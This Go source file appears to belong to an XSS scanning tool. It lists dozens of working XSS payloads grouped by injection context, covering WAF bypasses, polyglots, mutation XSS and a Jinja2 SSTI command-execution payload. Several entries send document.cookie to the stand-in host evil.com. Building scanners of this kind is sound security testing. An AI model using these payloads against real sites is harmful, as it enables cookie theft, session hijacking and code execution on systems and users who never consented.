package payload

import (
	"github.com/xsscan/xsscan/pkg/context"
	"github.com/xsscan/xsscan/pkg/model"
)

// extendedPayloads are additional payloads imported from community wordlists
// (dalfox, PortSwigger XSS cheat sheet, OWASP) and reclassified for xsscan's
// 19 injection contexts. Pre-merged into payloadTemplates in wordlist.go init().
var extendedPayloads = map[context.ContextType][]PayloadTemplate{
	context.ContextHTMLBody: {
		// Additional event handlers (mobile, pointer, transition)
		{Value: `<body onbeforeinput=alert(1)>`, Severity: model.High, Desc: "Body onbeforeinput"},
		{Value: `<body onhashchange=alert(1)>`, Severity: model.Medium, Desc: "Body onhashchange"},
		{Value: `<body onmessage=alert(1)>`, Severity: model.Medium, Desc: "Body onmessage (postMessage XSS)"},
		{Value: `<body onpointerenter=alert(1)>`, Severity: model.High, Desc: "Body onpointerenter"},
		{Value: `<body onpointermove=alert(1)>`, Severity: model.Medium, Desc: "Body onpointermove"},
		{Value: `<body ontransitionend=alert(1) style=transition:1s>`, Severity: model.Medium, Desc: "Body ontransitionend"},
		{Value: `<body onanimationstart=alert(1) style=animation:1s>`, Severity: model.Medium, Desc: "Body onanimationstart"},

		// Additional non-event payloads (no on* handler required)
		{Value: `<svg><script>alert(1)</script>`, Severity: model.High, Desc: "SVG script tag (no event handler)"},
		{Value: `<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>`, Severity: model.High, Desc: "MathML annotation-xml script"},
		{Value: `<xmp><script>alert(1)</script></xmp>`, Severity: model.High, Desc: "XMP script execution"},

		// CSS-based execution vectors (no on* handler)
		{Value: `<style>@keyframes x{}</style><div style="animation-name:x" onanimationend=alert(1)>`, Severity: model.High, Desc: "CSS animation event trigger"},

		// Additional WAF bypass variants
		{Value: `<IMG SRC=x ONERROR=alert(1)>`, Severity: model.High, Desc: "Uppercase tag+attr WAF bypass", WAFBypassOnly: true},
		{Value: `<ImG sRc=x oNeRrOr=alert(1)>`, Severity: model.High, Desc: "Mixed case WAF bypass", WAFBypassOnly: true},
		{Value: `<img/src="x"/onerror=alert(1)>`, Severity: model.High, Desc: "Slash-quote WAF bypass", WAFBypassOnly: true},
		{Value: `<img src=x onerror=alert(1) `, Severity: model.High, Desc: "URL-encodable onerror"},
		{Value: `<img src=x onerror=&#97;lert(1)>`, Severity: model.High, Desc: "HTML entity in handler (semi-encoded)", WAFBypassOnly: true},

		// Short payloads for length-constrained inputs
		{Value: `<q/oncut=alert(1)>`, Severity: model.High, Desc: "Short HTML5 oncut (15 chars)"},
		{Value: `<b/onmouseover=alert(1)>`, Severity: model.Medium, Desc: "Short onmouseover"},

		// Portal / popover (newer HTML features)
		{Value: `<portal src=javascript:alert(1)>`, Severity: model.Medium, Desc: "Portal javascript src"},
		{Value: `<div popover id=x>XSS</div><button popovertarget=x>`, Severity: model.Medium, Desc: "Popover API (Chrome)"},

		// Additional DOM clobbering vectors
		{Value: `<img name=currentScript onerror=alert(1)>`, Severity: model.High, Desc: "DOM clobber currentScript"},
		{Value: `<a name=notifications id=notifications>`, Severity: model.Medium, Desc: "DOM clobber notifications API"},

		// Additional mutation XSS
		{Value: `<table><math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`, Severity: model.High, Desc: "mXSS table-math nesting"},
		{Value: `<svg><desc><style><img src=x onerror=alert(1)>`, Severity: model.High, Desc: "mXSS svg-desc breakout"},
		{Value: `<svg><metadata><style><img src=x onerror=alert(1)>`, Severity: model.High, Desc: "mXSS svg-metadata breakout"},

		// Polyglot payloads (dalfox/PortSwigger/OWASP) — execute across multiple
		// contexts simultaneously; critical for blind/unknown-context scanning.
		{Value: `javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>`, Severity: model.Critical, Desc: "Polyglot: dalfox multi-close variant"},
		{Value: `</script><script>alert(1)</script>`, Severity: model.High, Desc: "Polyglot: script close-reopen"},
		{Value: `</textarea></script><svg onload=alert(1)>`, Severity: model.High, Desc: "Polyglot: textarea+script close to svg"},
		{Value: `</style></script><img src=x onerror=alert(1)>`, Severity: model.High, Desc: "Polyglot: style+script close to img"},
		{Value: `</xmp></script><svg/onload=alert(1)>`, Severity: model.High, Desc: "Polyglot: xmp+script close"},
		{Value: `</title></style></textarea></script><img src=x onerror=alert(1)>`, Severity: model.Critical, Desc: "Polyglot: dalfox quad-close"},
		{Value: `</noscript><svg onload=alert(1)>`, Severity: model.Medium, Desc: "Polyglot: noscript close"},
		{Value: `--></script><script>alert(1)</script><!--`, Severity: model.High, Desc: "Polyglot: comment-terminator to script"},
		{Value: `<<script>alert(1)//<script`, Severity: model.High, Desc: "Polyglot: filter-reassembly double open", WAFBypassOnly: true},
		{Value: `';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></script>"><img src=x onerror=alert(String.fromCharCode(88,83,83))><!--`, Severity: model.Critical, Desc: "Polyglot: OWASP classic XSS polyglot"},
		{Value: `<iframe srcdoc="<svg onload=alert(1)>">`, Severity: model.High, Desc: "Polyglot: iframe srcdoc svg"},
		{Value: `<svg><a xlink:href="javascript:alert(1)"><text>X</text></a></svg>`, Severity: model.Medium, Desc: "Polyglot: svg xlink javascript"},
		{Value: `<svg><set attributeName="href" to="javascript:alert(1)"/>`, Severity: model.Medium, Desc: "Polyglot: svg set href"},
	},

	context.ContextHTMLAttrValue: {
		// Polyglot payloads for attribute-value breakout (PortSwigger classics)
		{Value: `'"><svg/onload=alert(1)>`, Severity: model.High, Desc: "Polyglot: triple-quote breakout to svg"},
		{Value: `"><img src=x onerror=alert(1)>`, Severity: model.High, Desc: "Polyglot: double-quote breakout to img"},
		{Value: `'><svg/onload=alert(1)>`, Severity: model.High, Desc: "Polyglot: single-quote breakout to svg"},
		{Value: `"><svg/onload=alert(1)>`, Severity: model.High, Desc: "Polyglot: double-quote breakout to svg"},
		{Value: `"><img src=x onerror="alert(1)" x="`, Severity: model.High, Desc: "Polyglot: quoted img breakout"},
		{Value: `%22%3E%3Csvg%20onload=alert(1)%3E`, Severity: model.Medium, Desc: "Polyglot: URL-encoded breakout", WAFBypassOnly: true},
		{Value: `" autofocus onfocus=alert(1) "`, Severity: model.High, Desc: "Polyglot: autofocus double-quote"},

		// Quote-less breakout (space-separated)
		{Value: ` autofocus onfocus=alert(1) x=`, Severity: model.High, Desc: "Space breakout (no quotes)"},
		{Value: `%20autofocus%20onfocus=alert(1)%20`, Severity: model.High, Desc: "URL-encoded space breakout"},

		// Additional event handlers for attr contexts
		{Value: `" onpointerenter=alert(1) x="`, Severity: model.High, Desc: "Quote breakout + onpointerenter"},
		{Value: `" oncut=alert(1) x="`, Severity: model.High, Desc: "Quote breakout + oncut"},
		{Value: `" oncopy=alert(1) x="`, Severity: model.Medium, Desc: "Quote breakout + oncopy"},
		{Value: `" onpaste=alert(1) x="`, Severity: model.Medium, Desc: "Quote breakout + onpaste"},
		{Value: `" onanimationend=alert(1) x="`, Severity: model.High, Desc: "Quote breakout + CSS animation event"},

		// WAF bypass variants for attr contexts
		{Value: `" oNfOcUs=al\u0065rt(1) aUtOfOcUs="`, Severity: model.High, Desc: "Mixed case + unicode escape", WAFBypassOnly: true},
	},

	context.ContextJSString: {
		// Additional string breakout patterns
		{Value: `'*alert(1)*'`, Severity: model.High, Desc: "Quote breakout with asterisk padding"},
		{Value: `'%0aalert(1)%0a'`, Severity: model.High, Desc: "Newline-encoded breakout"},
		{Value: `\'-alert(1)//`, Severity: model.High, Desc: "Backslash-escaped quote breakout"},
		{Value: `</script><svg/onload=alert(1)>`, Severity: model.High, Desc: "Script close + SVG onload"},
		{Value: `';eval(atob('YWxlcnQoMSk='))//`, Severity: model.High, Desc: "eval+atob base64 alert"},

		// Unicode/hex escape variants
		{Value: `';eval('\x61lert(1)')//`, Severity: model.High, Desc: "Hex-escaped alert"},
		{Value: `';eval('\u0061lert(1)')//`, Severity: model.High, Desc: "Unicode-escaped alert"},
		// NOTE: comment-breakout payloads (*/...) live in ContextJSComment
		// only — inside a JS string they are inert text (false positive).
	},

	context.ContextJSTemplateLiteral: {
		// Template literal injection variants (moved from ContextJSString —
		// ${...} interpolation only executes inside backtick-delimited literals)
		{Value: `${document.cookie}`, Severity: model.Medium, Desc: "Template literal cookie exfil"},
		{Value: `${fetch('//evil.com?c='+document.cookie)}`, Severity: model.Medium, Desc: "Template literal fetch exfil"},
	},

	context.ContextHTMLEntity: {
		// Raw-text element reflections (textarea/title/xmp) — the only
		// executable path is closing the raw-text element first.
		{Value: `</textarea><img src=x onerror=alert(1)>`, Severity: model.High, Desc: "textarea close + img"},
		{Value: `</title><svg onload=alert(1)>`, Severity: model.High, Desc: "title close + svg"},
		{Value: `</xmp><script>alert(1)</script>`, Severity: model.High, Desc: "xmp close + script"},
	},

	context.ContextJSComment: {
		// JS comment breakout — close the comment then execute
		{Value: `*/alert(1)/*`, Severity: model.High, Desc: "JS block-comment breakout"},
		{Value: "\nalert(1)//", Severity: model.High, Desc: "JS line-comment newline breakout"},
		{Value: `*/eval(atob('YWxlcnQoMSk='))/*`, Severity: model.High, Desc: "JS comment breakout + eval base64"},
	},

	context.ContextSVGContainer: {
		// Inside <svg> container — script and foreignObject execute
		{Value: `<script>alert(1)</script>`, Severity: model.High, Desc: "SVG container script"},
		{Value: `<foreignObject><img src=x onerror=alert(1)></foreignObject>`, Severity: model.High, Desc: "SVG foreignObject img"},
		{Value: `<animate attributeName=href values=javascript:alert(1)>`, Severity: model.High, Desc: "SVG animate javascript href"},
	},

	context.ContextMathMLContainer: {
		// Inside <math> container — annotation-xml breakout or event handlers
		{Value: `<annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml>`, Severity: model.High, Desc: "MathML annotation-xml img"},
		{Value: `<img src=x onerror=alert(1)>`, Severity: model.High, Desc: "MathML container img"},
		{Value: `<mtext><img src=x onerror=alert(1)></mtext>`, Severity: model.High, Desc: "MathML mtext img"},
	},

	context.ContextURLAttr: {
		// Additional protocol variants
		{Value: `javascript:fetch('//evil.com?c='+document.cookie)`, Severity: model.Medium, Desc: "JS URI fetch exfil"},
		{Value: `javascript:void(document.body.innerHTML='<img src=x onerror=alert(1)>')`, Severity: model.High, Desc: "JS URI innerHTML injection"},
		{Value: `javascript:eval(atob('YWxlcnQoMSk='))`, Severity: model.High, Desc: "JS URI eval base64"},

		// Encoded javascript: variants
		{Value: `java%0d%0ascript:alert(1)`, Severity: model.High, Desc: "CRLF-encoded javascript URI"},
		{Value: `\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74:alert(1)`, Severity: model.High, Desc: "Hex-encoded javascript URI prefix"},
		{Value: `blob:javascript:alert(1)`, Severity: model.Medium, Desc: "Blob javascript URI chain"},
	},

	context.ContextJSBlock: {
		// Additional direct JS execution variants
		{Value: `(alert)(1)`, Severity: model.Critical, Desc: "Indirect function call"},
		{Value: `window['alert'](1)`, Severity: model.Critical, Desc: "Bracket access alert"},
		{Value: `top['alert'](1)`, Severity: model.Critical, Desc: "top window alert"},
		{Value: `self['alert'](1)`, Severity: model.Critical, Desc: "self window alert"},
		{Value: `[].constructor.constructor('alert(1)')()`, Severity: model.Critical, Desc: "Array constructor chain"},
		{Value: `''.constructor.constructor('alert(1)')()`, Severity: model.Critical, Desc: "String constructor chain"},
	},

	context.ContextHTMLComment: {
		// Additional comment breakout payloads
		{Value: `--!><img src=x onerror=alert(1)>`, Severity: model.High, Desc: "Bang-comment variant breakout"},
		{Value: `--><svg/onload=alert(1)>`, Severity: model.High, Desc: "Comment + SVG onload"},
		{Value: `--><body onload=alert(1)>`, Severity: model.Medium, Desc: "Comment + body onload"},
	},

	context.ContextTemplate: {
		// Additional framework template injection payloads
		{Value: `{{_instance.constructor('alert(1)')()}}`, Severity: model.High, Desc: "Vue instance constructor"},
		{Value: `{{$emit.constructor('alert(1)')()}}`, Severity: model.High, Desc: "Vue emit constructor"},
		{Value: `{$smarty.template_object->smarty->enableSecurity()}`, Severity: model.Medium, Desc: "Smarty template injection"},
		{Value: `{%import os%}{{os.system('id')}}`, Severity: model.Critical, Desc: "Jinja2 import os (SSTI/RCE)"},
	},

	context.ContextJSONValue: {
		// Additional JSON breakout payloads
		{Value: `"}},alert(1),{"x":"`, Severity: model.High, Desc: "JSON double-object breakout"},
		{Value: `"]};alert(1)//`, Severity: model.High, Desc: "JSON array-object breakout"},
	},

	context.ContextCSSValue: {
		// CSS injection variants
		{Value: `url(javascript:alert(1))`, Severity: model.Medium, Desc: "CSS url javascript (older browsers)"},
		{Value: `-moz-binding:url(//evil.com/xss.xml#xss)`, Severity: model.Medium, Desc: "Mozilla XBL binding (Firefox legacy)"},
	},

	context.ContextCSSBlock: {
		{Value: `</style><iframe srcdoc="<script>alert(1)</script>">`, Severity: model.High, Desc: "Style breakout + iframe srcdoc"},
	},
}
